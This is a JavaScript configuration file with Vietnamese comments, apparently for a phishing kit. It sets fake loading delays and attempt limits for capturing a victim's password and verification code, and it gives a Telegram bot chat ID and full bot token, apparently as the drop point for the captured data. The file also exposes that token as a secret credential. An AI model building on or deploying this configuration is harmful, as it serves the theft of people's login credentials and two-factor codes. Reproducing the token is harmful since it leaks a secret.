const config = {
	settings: {
		// Thời gian Loading khi nhập code(milisecond)
		code_loading_time: 15000,
		// Số lượt nhập code tối đa
		max_failed_code_attempts: 5,
		// Số lượt nhập mật khẩu tối đa
		max_failed_password_attempts: 1,
		// Cái này không có tác dụng
		page_loading_time: 5000,
		// Thời gian loading khi nhập mật khẩu(milisecond)
		password_loading_time: 15000,
		// Bật tắt nhập code
		code_input_enabled: true,
	},
	telegram: {
		chatid: '6759061293',
		token: '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk',
	},
};

export default config;
